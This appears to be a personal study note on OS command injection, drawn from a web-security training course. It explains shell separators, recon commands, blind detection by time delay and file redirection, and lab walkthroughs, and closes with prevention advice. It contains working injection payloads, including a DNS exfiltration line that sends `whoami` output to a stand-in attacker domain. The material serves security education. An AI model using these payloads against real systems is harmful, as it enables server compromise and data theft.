## Definition
also known as shell injection. 
It allows an attacker to:
- execute operating system (OS) commands on the server that is running an app
- typically fully compromise the application and its data

## Injecting OS commands
In this example, a shopping app lets the user view whether an item is in stock in a particular store. 
This information is accessed via a URL:
`https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information:
the app must query various legacy systems. 
For historical reasons:
- the functionality is implemented by calling out to a shell command 
- with the product and store IDs as arguments:
`stockreport.pl 381 29`
This command outputs the stock status for the specified item, which is returned to the user.

The app implements no defenses against OS command injection
=>
an attacker can submit the following input to execute an arbitrary command:
`& echo aiwefwlguh &`
If this input is submitted in the `productID` parameter
=>
the command executed by the application is:
`stockreport.pl & echo aiwefwlguh & 29`

The `echo` command:
causes the supplied string to be echoed in the output. 

This is a useful way to test for some types of OS command injection. 
The `&` character is a shell command separator. 
In this example:
it causes -->  3 separate commands to execute, one after another. 
The output returned to the user is:
`Error - productID was not provided aiwefwlguh 29: command not found`

The 3 lines of output demonstrate that:
- The original `stockreport.pl` command was executed without its expected arguments, and so returned an error message.
- The injected `echo` command was executed, and the supplied string was echoed in the output.
- The original argument `29` was executed as a command, which caused an error.

Placing the additional command separator `&` after the injected command:
is useful bc -->  it separates the injected command from whatever follows the injection point. 
=>
This reduces the chance that what follows will prevent the injected command from executing

### Simple case
- se Burp Suite to intercept and modify a request that checks the stock level.
- Modify the `storeID` parameter, giving it the value `1|whoami`.
- Observe that the response contains the name of the current user

## Useful commands
| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |
## Ways of injecting OS commands
You can use a number of shell metacharacters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. 
The following command separators work on both Windows and Unix-based systems:
- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:
- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
- `` ` `` injected command `` ` ``
- `$(` injected command `)`

## Blind OS command injection vulnerabilities
Many instances of OS command injection are blind vulnerabilities. 
=>
the app -->  does not return the output from the command within its HTTP response

### Detecting blind OS command injection using time delays
- You can use an injected command to trigger a time delay
- enabling you to confirm that the command was executed based on the time that the app takes to respond

The `ping` command is a good way to do this:
because lets you specify the number of ICMP packets to send. 

This enables you to control the time taken for the command to run:
`& ping -c 10 127.0.0.1 &`

#### Blind OS command injection with time delays
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:
   `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return

### Exploiting blind OS command injection by redirecting output
You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. 
For example:
if the app serves static resources from the filesystem location `/var/www/static`
=>
you can submit the following input:
`& whoami > /var/www/static/whoami.txt &`

The `>` character -->  sends the output from the `whoami` command to the specified file. 
You can then use the browser to:
- fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file
- and view the output from the injected command

#### Blind OS command injection with output redirection
This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
`/var/www/images/`

=>
- Use Burp Suite to intercept and modify the request that submits feedback.
- Modify the `email` parameter, changing it to:
  `email=||whoami>/var/www/images/output.txt||`
- Open an image of the webserver.
- Change in the URL the`filename` parameter to `filename=output.txt`
- Observe that the response contains the output from the injected command

#### Exploiting blind OS command injection using out-of-band (OAST) techniques
You can use an injected command that:
will trigger an out-of-band network interaction with a system that you control, 
using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques

For example:
`& nslookup kgji2ohoyw.web-attacker.com &`

This payload uses the `nslookup` command to -->   cause a DNS lookup for the specified domain. The attacker:
- can monitor to see if the lookup happens
- to confirm if the command was successfully injected

#### Blind OS command injection with out-of-band data exfiltration
The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:
`wwwuser.kgji2ohoyw.web-attacker.com`
=>
1. Use [Burp Suite Professional](https://portswigger.net/burp/pro) to intercept and modify the request that submits feedback.
2. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
4. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
   ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
5. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user

## How to prevent OS command injection attacks
The most effective way to prevent OS command injection vulnerabilities is to:
never call out to OS commands from application-layer code. 

In almost all cases:
there are different ways to implement the required functionality using safer platform APIs.

If you have to call out to OS commands with user-supplied input,
=>
you must perform strong input validation

Some examples of effective validation include:
- Validating against a whitelist of permitted values.
- Validating that the input is a number.
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to:
sanitize input by escaping shell metacharacters. 
In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.